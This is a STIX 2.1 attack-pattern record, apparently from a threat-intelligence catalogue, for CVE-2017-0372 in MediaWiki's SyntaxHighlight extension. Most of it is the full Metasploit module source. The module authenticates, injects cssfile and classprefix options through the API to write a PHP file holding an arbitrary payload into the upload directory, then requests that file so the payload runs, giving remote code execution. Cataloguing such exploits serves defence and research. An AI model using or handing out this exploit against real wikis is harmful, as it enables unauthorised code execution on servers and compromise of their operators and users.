{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96f4cce8-161c-4689-ac75-e4774836d5f5",
    "created": "2024-08-14T17:09:37.058543Z",
    "modified": "2024-08-14T17:09:37.058547Z",
    "name": "MediaWiki SyntaxHighlight extension option injection vulnerability",
    "description": " This module exploits an option injection vulnerability in the SyntaxHighlight extension of MediaWiki. It tries to create & execute a PHP file in the document root. The USERNAME & PASSWORD options are only needed if the Wiki is configured as private.  This vulnerability affects any MediaWiki installation with SyntaxHighlight version 2.0 installed & enabled. This extension ships with the AIO package of MediaWiki version 1.27.x & 1.28.x. A fix for this issue is included in MediaWiki version 1.28.2 and version 1.27.3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mediawiki_syntaxhighlight.rb",
            "external_id": "mediawiki_syntaxhighlight.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0372"
        },
        {
            "source_name": "reference",
            "url": "https://lists.wikimedia.org/pipermail/mediawiki-announce/2017-April/000207.html"
        },
        {
            "source_name": "reference",
            "url": "https://phabricator.wikimedia.org/T158689"
        },
        {
            "source_name": "reference",
            "url": "https://securify.nl/advisory/SFY20170201/syntaxhighlight_mediawiki_extension_allows_injection_of_arbitrary_pygments_options.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'MediaWiki SyntaxHighlight extension option injection vulnerability',\n      'Description'    => %q{\n        This module exploits an option injection vulnerability in the SyntaxHighlight\n        extension of MediaWiki. It tries to create & execute a PHP file in the document root.\n        The USERNAME & PASSWORD options are only needed if the Wiki is configured as private.\n\n        This vulnerability affects any MediaWiki installation with SyntaxHighlight version 2.0\n        installed & enabled. This extension ships with the AIO package of MediaWiki version\n        1.27.x & 1.28.x. A fix for this issue is included in MediaWiki version 1.28.2 and\n        version 1.27.3.\n      },\n      'Author' => 'Yorick Koster',\n      'License' => MSF_LICENSE,\n      'Platform' => 'php',\n      'Payload' => { 'BadChars' => \"#{(0x1..0x1f).to_a.pack('C*')} ,'\\\"\" } ,\n      'References' =>\n        [\n          [ 'CVE', '2017-0372' ],\n          [ 'URL', 'https://lists.wikimedia.org/pipermail/mediawiki-announce/2017-April/000207.html' ],\n          [ 'URL', 'https://phabricator.wikimedia.org/T158689' ],\n          [ 'URL', 'https://securify.nl/advisory/SFY20170201/syntaxhighlight_mediawiki_extension_allows_injection_of_arbitrary_pygments_options.html' ]\n        ],\n      'Arch' => ARCH_PHP,\n      'Targets' =>\n        [\n          ['Automatic Targeting', { 'auto' => true }  ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2017-04-06'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"MediaWiki base path (eg, /w, /wiki, /mediawiki)\", '/wiki' ]),\n        OptString.new('UPLOADPATH', [ true, \"Relative local upload path\", 'images' ]),\n        OptString.new('USERNAME', [ false, \"Username to authenticate with\", '' ]),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", '' ]),\n        OptBool.new('CLEANUP', [ false, \"Delete created PHP file?\", true ])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'api.php'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'action' => 'parse',\n        'format' => 'json',\n        'contentmodel' => 'wikitext',\n        'text' => '<syntaxhighlight lang=\"java\" start=\"0,full=1\"></syntaxhighlight>'\n      }\n    })\n\n    if(res && res.headers.key?('MediaWiki-API-Error'))\n      if(res.headers['MediaWiki-API-Error'] == 'internal_api_error_MWException')\n        return Exploit::CheckCode::Appears\n      elsif(res.headers['MediaWiki-API-Error'] == 'readapidenied')\n        print_error(\"Login is required\")\n      end\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  # use deprecated interface\n  def login\n    print_status(\"Trying to login....\")\n    # get login token\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'api.php'),\n      'vars_post' => {\n        'action' => 'login',\n        'format' => 'json',\n        'lgname' => datastore['USERNAME']\n      }\n    })\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n    json = res.get_json_document\n    if json.empty? || !json['login'] || !json['login']['token']\n      fail_with(Failure::Unknown, 'Server returned an invalid response')\n    end\n    logintoken = json['login']['token']\n    @cookie = res.get_cookies\n\n    # login\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'api.php'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'action' => 'login',\n        'format' => 'json',\n        'lgname' => datastore['USERNAME'],\n        'lgpassword' => datastore['PASSWORD'],\n        'lgtoken' => logintoken\n      }\n    })\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n    json = res.get_json_document\n    if json.empty? || !json['login'] || !json['login']['result']\n      fail_with(Failure::Unknown, 'Server returned an invalid response')\n    end\n    if json['login']['result'] == 'Success'\n      @cookie = res.get_cookies\n    else\n      fail_with(Failure::Unknown, 'Failed to login')\n    end\n  end\n\n  def exploit\n    @cookie = ''\n    if datastore['USERNAME'] && datastore['USERNAME'].length > 0\n      login\n    end\n\n    check_code = check\n    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears\n      fail_with(Failure::NoTarget, \"#{peer}\")\n    end\n\n    phpfile = \"#{rand_text_alpha_lower(25)}.php\"\n    cssfile = \"#{datastore['UPLOADPATH']}/#{phpfile}\"\n    cleanup = \"unlink(\\\"#{phpfile}\\\");\"\n    if not datastore['CLEANUP']\n      cleanup = \"\"\n    end\n    print_status(\"Local PHP file: #{cssfile}\")\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'api.php'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'action' => 'parse',\n        'format' => 'json',\n        'contentmodel' => 'wikitext',\n        'text' => \"<syntaxhighlight lang='java' start='0,full=1,cssfile=#{cssfile},classprefix=&lt;?php #{cleanup}#{payload.encoded} exit;?&gt;'></syntaxhighlight>\"\n      }\n    })\n    if res\n      print_status(\"Trying to run #{normalize_uri(target_uri.path, cssfile)}\")\n      send_request_cgi({'uri' => normalize_uri(target_uri.path, cssfile)})\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-06",
    "x_mitre_platforms": [
        "php'"
    ]
}